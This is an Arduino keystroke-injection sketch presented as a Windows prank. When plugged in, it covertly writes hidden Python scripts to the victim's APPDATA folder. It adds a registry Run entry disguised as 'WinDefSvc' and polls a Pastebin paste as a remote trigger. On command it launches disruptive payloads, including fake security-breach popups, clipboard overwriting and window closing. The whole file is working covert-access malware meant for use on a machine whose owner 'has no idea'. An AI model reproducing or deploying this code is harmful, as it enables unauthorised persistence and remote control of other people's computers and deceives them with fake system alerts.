#include <Keyboard.h>

// Arduino Pro Micro / Leonardo — Windows Ultimate Prank
// Pastebin ID: jL4y1WVJ
//
// HOW IT WORKS:
//   1. Plug in — all 12 prank scripts are silently installed. Nothing happens yet.
//   2. Arduino is removed. Target has no idea.
//   3. When you're ready, put a command word in your Pastebin paste.
//   4. The background watcher (checks every 5 min) triggers the matching prank(s).
//
// PASTEBIN COMMANDS (put one in https://pastebin.com/jL4y1WVJ):
//   ACTIVATE  — launches ALL 12 pranks at once
//   JIGGLE    — mouse teleports to random corner
//   MINIMISE  — minimises all windows
//   SOUND     — random system beep
//   NOTIFY    — fake critical error popup
//   CLIPBOARD — replaces clipboard contents
//   ZOOM      — zooms in on everything
//   CAPS      — toggles caps lock
//   VOLUME    — randomly spikes or drops volume
//   CLOSE     — closes foreground window
//   SPEECH    — PC speaks out loud
//   DARK      — flips dark/light mode
//   SCROLL    — random scroll jump
//   STOP      — kills everything, removes persistence, deletes files
//
// No pip installs. Uses only: ctypes, winsound, winreg, subprocess (all built-in).

void typeln(const char* s) {
  Keyboard.print(s);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(150);
}

void setup() {
  Keyboard.begin();
  delay(5000);

  // Win+R → PowerShell
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2500);

  typeln("$d=$env:APPDATA");

  // === 1. JIGGLE — Mouse teleporter (.j.py) ===
  // Moves to completely random position every 60s once active
  typeln("$f=\"$d\\.j.py\"");
  typeln("'import ctypes,time,random' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(60)' | ac $f");
  typeln("' ctypes.windll.user32.SetCursorPos(random.randint(0,3840),random.randint(0,2160))' | ac $f");

  // === 2. MINIMISE — Win+M every 3 min (.w.py) ===
  typeln("$f=\"$d\\.w.py\"");
  typeln("'import ctypes,time' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(180)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x5B,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x4D,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x4D,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x5B,0,2,0)' | ac $f");

  // === 3. SOUND — Random Windows beep every 60s (.s.py) ===
  typeln("$f=\"$d\\.s.py\"");
  typeln("'import winsound,time,random' | sc $f");
  typeln("'b=[0,16,32,48,64]' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(60)' | ac $f");
  typeln("' winsound.MessageBeep(random.choice(b))' | ac $f");

  // === 4. NOTIFY — Fake critical error popups every 3 min (.n.py) ===
  typeln("$f=\"$d\\.n.py\"");
  typeln("'import subprocess,time,random' | sc $f");
  typeln("'t=[''Critical Error'',''Security Warning'',''System Failure'',''Disk Error'',''Memory Fault'',''Network Breach'']' | ac $f");
  typeln("'m=[''A critical system error has occurred'',''Suspicious activity detected on this PC'',''Windows has stopped working correctly'',''Hard drive read error. Backup data immediately'',''RAM allocation failure. Restart required'',''Unauthorised remote access attempt blocked'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(180)' | ac $f");
  typeln("' i=random.randint(0,5)' | ac $f");
  typeln("' subprocess.Popen([''mshta'',''javascript:new ActiveXObject(\"WScript.Shell\").Popup(\\''+m[i]+'\\',5,\\''+t[i]+'\\',16);close()''])' | ac $f");

  // === 5. CLIPBOARD — Replace clipboard with confusing messages every 45s (.c.py) ===
  typeln("$f=\"$d\\.c.py\"");
  typeln("'import subprocess,time,random' | sc $f");
  typeln("'m=[''what did you copy'',''nice try'',''I already read that'',''that belongs to me now'',''clipboard accessed'',''did you mean to copy that'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(45)' | ac $f");
  typeln("' subprocess.run([''powershell'',''-c'',''Set-Clipboard \"''+random.choice(m)+''\"''])' | ac $f");

  // === 6. ZOOM — Ctrl+= zooms in every 90s (.z.py) ===
  typeln("$f=\"$d\\.z.py\"");
  typeln("'import ctypes,time' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(90)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x11,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0xBB,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0xBB,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x11,0,2,0)' | ac $f");

  // === 7. CAPS — Toggle caps lock every 60s (.k.py) ===
  typeln("$f=\"$d\\.k.py\"");
  typeln("'import ctypes,time' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(60)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x14,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x14,0,2,0)' | ac $f");

  // === 8. VOLUME — Spike or drop volume randomly every 60s (.v.py) ===
  typeln("$f=\"$d\\.v.py\"");
  typeln("'import ctypes,time,random' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(60)' | ac $f");
  typeln("' k=random.choice([0xAE,0xAF])' | ac $f");
  typeln("' n=random.randint(5,15)' | ac $f");
  typeln("' for _ in range(n):' | ac $f");
  typeln("'  ctypes.windll.user32.keybd_event(k,0,0,0)' | ac $f");
  typeln("'  ctypes.windll.user32.keybd_event(k,0,2,0)' | ac $f");

  // === 9. CLOSE — Alt+F4 closes foreground window every 4 min (.x.py) ===
  typeln("$f=\"$d\\.x.py\"");
  typeln("'import ctypes,time' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(240)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x12,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x73,0,0,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x73,0,2,0)' | ac $f");
  typeln("' ctypes.windll.user32.keybd_event(0x12,0,2,0)' | ac $f");

  // === 10. SPEECH — SAPI voice speaks every 2 min (.p.py) ===
  typeln("$f=\"$d\\.p.py\"");
  typeln("'import subprocess,time,random' | sc $f");
  typeln("'m=[''Hi'',''Message from PC'',''Hi there'',''Hello'',''Can you hear me'',''I am your computer'']' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(120)' | ac $f");
  typeln("' subprocess.Popen([''mshta'',''vbscript:CreateObject(\"SAPI.SpVoice\").Speak(\"''+random.choice(m)+''\")(window.close)''])' | ac $f");

  // === 11. DARK — Flip dark/light mode every 5 min (.d.py) ===
  typeln("$f=\"$d\\.d.py\"");
  typeln("'import winreg,time' | sc $f");
  typeln("'K=r''Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize''' | ac $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(300)' | ac $f");
  typeln("' try:' | ac $f");
  typeln("'  h=winreg.OpenKey(winreg.HKEY_CURRENT_USER,K,0,winreg.KEY_ALL_ACCESS)' | ac $f");
  typeln("'  v,_=winreg.QueryValueEx(h,''AppsUseLightTheme'')' | ac $f");
  typeln("'  winreg.SetValueEx(h,''AppsUseLightTheme'',0,winreg.REG_DWORD,1-v)' | ac $f");
  typeln("'  winreg.CloseKey(h)' | ac $f");
  typeln("' except:pass' | ac $f");

  // === 12. SCROLL — Random big scroll jump every 45s (.r.py) ===
  typeln("$f=\"$d\\.r.py\"");
  typeln("'import ctypes,time,random' | sc $f");
  typeln("'while 1:' | ac $f");
  typeln("' time.sleep(45)' | ac $f");
  typeln("' ctypes.windll.user32.mouse_event(0x800,0,0,random.choice([-600,600]),0)' | ac $f");

  // === Pastebin trigger + Registry persistence (.t.py) ===
  // Runs hidden at login, polls Pastebin every 5 min, launches scripts on command
  typeln("$f=\"$d\\.t.py\"");
  typeln("'import subprocess,time,urllib.request,os,winreg' | sc $f");
  typeln("'p=os.path.join(os.environ[''APPDATA''],''.t.py'')' | ac $f");
  typeln("'try:' | ac $f");
  typeln("' k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r''Software\\Microsoft\\Windows\\CurrentVersion\\Run'',0,winreg.KEY_SET_VALUE)' | ac $f");
  typeln("' winreg.SetValueEx(k,''WinDefSvc'',0,winreg.REG_SZ,''pythonw ''+p)' | ac $f");
  typeln("' winreg.CloseKey(k)' | ac $f");
  typeln("'except:pass' | ac $f");
  typeln("'d=os.environ[''APPDATA'']' | ac $f");
  typeln("'fs=[os.path.join(d,x) for x in [''.j.py'',''.w.py'',''.s.py'',''.n.py'',''.c.py'',''.z.py'',''.k.py'',''.v.py'',''.x.py'',''.p.py'',''.d.py'',''.r.py'']]' | ac $f");
  typeln("'URL=''https://pastebin.com/raw/jL4y1WVJ''' | ac $f");
  typeln("'def g():' | ac $f");
  typeln("' try:return urllib.request.urlopen(URL,timeout=5).read().decode()' | ac $f");
  typeln("' except:return ''''  ' | ac $f");
  typeln("'while True:' | ac $f");
  typeln("' t=g()' | ac $f");
  typeln("' if ''STOP'' in t:' | ac $f");
  typeln("'  try:' | ac $f");
  typeln("'   k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r''Software\\Microsoft\\Windows\\CurrentVersion\\Run'',0,winreg.KEY_SET_VALUE)' | ac $f");
  typeln("'   winreg.DeleteValue(k,''WinDefSvc'')' | ac $f");
  typeln("'   winreg.CloseKey(k)' | ac $f");
  typeln("'  except:pass' | ac $f");
  typeln("'  subprocess.run([''taskkill'',''/f'',''/im'',''pythonw.exe''],capture_output=1)' | ac $f");
  typeln("'  [os.remove(f) for f in fs if os.path.exists(f)]' | ac $f");
  typeln("'  break' | ac $f");
  typeln("' if ''ACTIVATE'' in t:' | ac $f");
  typeln("'  for f in fs:subprocess.Popen([''pythonw'',f])' | ac $f");
  typeln("'  break' | ac $f");
  typeln("' if ''JIGGLE'' in t:subprocess.Popen([''pythonw'',fs[0]]);break' | ac $f");
  typeln("' if ''MINIMISE'' in t:subprocess.Popen([''pythonw'',fs[1]]);break' | ac $f");
  typeln("' if ''SOUND'' in t:subprocess.Popen([''pythonw'',fs[2]]);break' | ac $f");
  typeln("' if ''NOTIFY'' in t:subprocess.Popen([''pythonw'',fs[3]]);break' | ac $f");
  typeln("' if ''CLIPBOARD'' in t:subprocess.Popen([''pythonw'',fs[4]]);break' | ac $f");
  typeln("' if ''ZOOM'' in t:subprocess.Popen([''pythonw'',fs[5]]);break' | ac $f");
  typeln("' if ''CAPS'' in t:subprocess.Popen([''pythonw'',fs[6]]);break' | ac $f");
  typeln("' if ''VOLUME'' in t:subprocess.Popen([''pythonw'',fs[7]]);break' | ac $f");
  typeln("' if ''CLOSE'' in t:subprocess.Popen([''pythonw'',fs[8]]);break' | ac $f");
  typeln("' if ''SPEECH'' in t:subprocess.Popen([''pythonw'',fs[9]]);break' | ac $f");
  typeln("' if ''DARK'' in t:subprocess.Popen([''pythonw'',fs[10]]);break' | ac $f");
  typeln("' if ''SCROLL'' in t:subprocess.Popen([''pythonw'',fs[11]]);break' | ac $f");
  typeln("' time.sleep(300)' | ac $f");

  // Launch trigger silently. Nothing visible happens. Close PowerShell.
  typeln("Start-Process pythonw \"$d\\.t.py\" -WindowStyle Hidden");
  typeln("exit");
}
void loop() {}
